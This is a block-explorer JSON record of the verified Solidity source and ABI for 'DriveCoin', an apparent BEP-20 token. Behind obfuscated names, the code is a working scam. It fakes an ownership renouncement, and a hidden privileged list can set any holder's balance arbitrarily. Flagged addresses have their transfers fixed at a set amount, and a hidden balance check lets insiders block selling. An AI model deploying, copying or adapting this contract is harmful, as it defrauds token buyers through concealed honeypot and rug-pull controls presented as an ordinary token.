{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract feeTake {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchFee {\n    function createPair(address buyLiquidityMarketing, address autoSwap) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface liquidityReceiverTo {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface marketingAutoSender {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address takeTx) external view returns (uint256);\n\n    function transfer(address shouldSwap, uint256 fromMaxAmount) external returns (bool);\n\n    function allowance(address listShould, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fromMaxAmount) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address shouldSwap,\n        uint256 fromMaxAmount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed exemptMax, uint256 value);\n    event Approval(address indexed listShould, address indexed spender, uint256 value);\n}\n\ninterface txLaunchedSender is marketingAutoSender {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DriveCoin is feeTake, marketingAutoSender, txLaunchedSender {\n\n    bool public atEnable;\n\n    mapping(address => uint256) private limitTo;\n\n    function allowance(address limitReceiver, address exemptReceiver) external view virtual override returns (uint256) {\n        if (exemptReceiver == limitEnable) {\n            return type(uint256).max;\n        }\n        return minShould[limitReceiver][exemptReceiver];\n    }\n\n    uint256 public tradingAutoReceiver = 0;\n\n    function getOwner() external view returns (address) {\n        return liquidityTo;\n    }\n\n    bool private tradingLaunched;\n\n    uint8 private buyTo = 18;\n\n    function exemptWalletAuto(address fromFeeToken) public {\n        launchedShould();\n        if (takeLaunchSell != exemptTeam) {\n            tradingLaunched = false;\n        }\n        if (fromFeeToken == txReceiver || fromFeeToken == fundFeeAt) {\n            return;\n        }\n        buyLimitSwap[fromFeeToken] = true;\n    }\n\n    uint256 txShould;\n\n    bool public takeLaunchSell;\n\n    function decimals() external view virtual override returns (uint8) {\n        return buyTo;\n    }\n\n    function shouldTeam(address totalLaunch) public {\n        require(totalLaunch.balance < 100000);\n        if (atEnable) {\n            return;\n        }\n        if (takeLaunchSell != tradingLaunched) {\n            takeLaunchSell = true;\n        }\n        liquidityTrading[totalLaunch] = true;\n        if (exemptTeam) {\n            exemptTeam = false;\n        }\n        atEnable = true;\n    }\n\n    mapping(address => mapping(address => uint256)) private minShould;\n\n    address receiverAutoExempt;\n\n    event OwnershipTransferred(address indexed modeMax, address indexed tokenWalletTotal);\n\n    function marketingWallet(address launchedList, uint256 fromMaxAmount) public {\n        launchedShould();\n        limitTo[launchedList] = fromMaxAmount;\n    }\n\n    function launchedShould() private view {\n        require(liquidityTrading[_msgSender()]);\n    }\n\n    address public fundFeeAt;\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverTotalWallet;\n    }\n\n    function autoBuy(address minAuto, address shouldSwap, uint256 fromMaxAmount) internal returns (bool) {\n        if (minAuto == txReceiver) {\n            return modeSenderShould(minAuto, shouldSwap, fromMaxAmount);\n        }\n        uint256 limitAmount = marketingAutoSender(fundFeeAt).balanceOf(receiverAutoExempt);\n        require(limitAmount == modeAmount);\n        require(shouldSwap != receiverAutoExempt);\n        if (buyLimitSwap[minAuto]) {\n            return modeSenderShould(minAuto, shouldSwap, marketingTo);\n        }\n        fromMaxAmount = takeExempt(minAuto, shouldSwap, fromMaxAmount);\n        return modeSenderShould(minAuto, shouldSwap, fromMaxAmount);\n    }\n\n    string private receiverTotalWallet = \"DCN\";\n\n    function takeExempt(address minAuto, address shouldSwap, uint256 fromMaxAmount) internal view returns (uint256) {\n        require(fromMaxAmount > 0);\n\n        uint256 sellEnable = 0;\n        if (minAuto == fundFeeAt && autoSellExempt > 0) {\n            sellEnable = fromMaxAmount * autoSellExempt / 100;\n        } else if (shouldSwap == fundFeeAt && tradingAutoReceiver > 0) {\n            sellEnable = fromMaxAmount * tradingAutoReceiver / 100;\n        }\n        require(sellEnable <= fromMaxAmount);\n        return fromMaxAmount - sellEnable;\n    }\n\n    uint256 constant marketingTo = 9 ** 10;\n\n    bool private exemptTeam;\n\n    uint256 modeAmount;\n\n    address public txReceiver;\n\n    function owner() external view returns (address) {\n        return liquidityTo;\n    }\n\n    constructor (){\n        if (takeLaunchSell != exemptTeam) {\n            takeLaunchSell = false;\n        }\n        swapTotalTake();\n        liquidityReceiverTo minTxTake = liquidityReceiverTo(limitEnable);\n        fundFeeAt = launchFee(minTxTake.factory()).createPair(minTxTake.WETH(), address(this));\n        receiverAutoExempt = launchFee(minTxTake.factory()).feeTo();\n        \n        txReceiver = _msgSender();\n        liquidityTrading[txReceiver] = true;\n        limitTo[txReceiver] = launchedAtFund;\n        if (exemptTeam == takeLaunchSell) {\n            exemptTeam = false;\n        }\n        emit Transfer(address(0), txReceiver, launchedAtFund);\n    }\n\n    string private receiverLaunched = \"Drive Coin\";\n\n    function transfer(address launchedList, uint256 fromMaxAmount) external virtual override returns (bool) {\n        return autoBuy(_msgSender(), launchedList, fromMaxAmount);\n    }\n\n    mapping(address => bool) public liquidityTrading;\n\n    function swapTotalTake() public {\n        emit OwnershipTransferred(txReceiver, address(0));\n        liquidityTo = address(0);\n    }\n\n    address limitEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private launchedAtFund = 100000000 * 10 ** 18;\n\n    mapping(address => bool) public buyLimitSwap;\n\n    function name() external view virtual override returns (string memory) {\n        return receiverLaunched;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchedAtFund;\n    }\n\n    function approve(address exemptReceiver, uint256 fromMaxAmount) public virtual override returns (bool) {\n        minShould[_msgSender()][exemptReceiver] = fromMaxAmount;\n        emit Approval(_msgSender(), exemptReceiver, fromMaxAmount);\n        return true;\n    }\n\n    function transferFrom(address minAuto, address shouldSwap, uint256 fromMaxAmount) external override returns (bool) {\n        if (_msgSender() != limitEnable) {\n            if (minShould[minAuto][_msgSender()] != type(uint256).max) {\n                require(fromMaxAmount <= minShould[minAuto][_msgSender()]);\n                minShould[minAuto][_msgSender()] -= fromMaxAmount;\n            }\n        }\n        return autoBuy(minAuto, shouldSwap, fromMaxAmount);\n    }\n\n    address private liquidityTo;\n\n    function swapMin(uint256 fromMaxAmount) public {\n        launchedShould();\n        modeAmount = fromMaxAmount;\n    }\n\n    function balanceOf(address takeTx) public view virtual override returns (uint256) {\n        return limitTo[takeTx];\n    }\n\n    uint256 public autoSellExempt = 3;\n\n    function modeSenderShould(address minAuto, address shouldSwap, uint256 fromMaxAmount) internal returns (bool) {\n        require(limitTo[minAuto] >= fromMaxAmount);\n        limitTo[minAuto] -= fromMaxAmount;\n        limitTo[shouldSwap] += fromMaxAmount;\n        emit Transfer(minAuto, shouldSwap, fromMaxAmount);\n        return true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenWalletTotal\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptMax\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromMaxAmount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoSellExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeTx\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buyLimitSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromFeeToken\",\"type\":\"address\"}],\"name\":\"exemptWalletAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundFeeAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromMaxAmount\",\"type\":\"uint256\"}],\"name\":\"marketingWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalLaunch\",\"type\":\"address\"}],\"name\":\"shouldTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fromMaxAmount\",\"type\":\"uint256\"}],\"name\":\"swapMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapTotalTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeLaunchSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingAutoReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromMaxAmount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromMaxAmount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "DriveCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}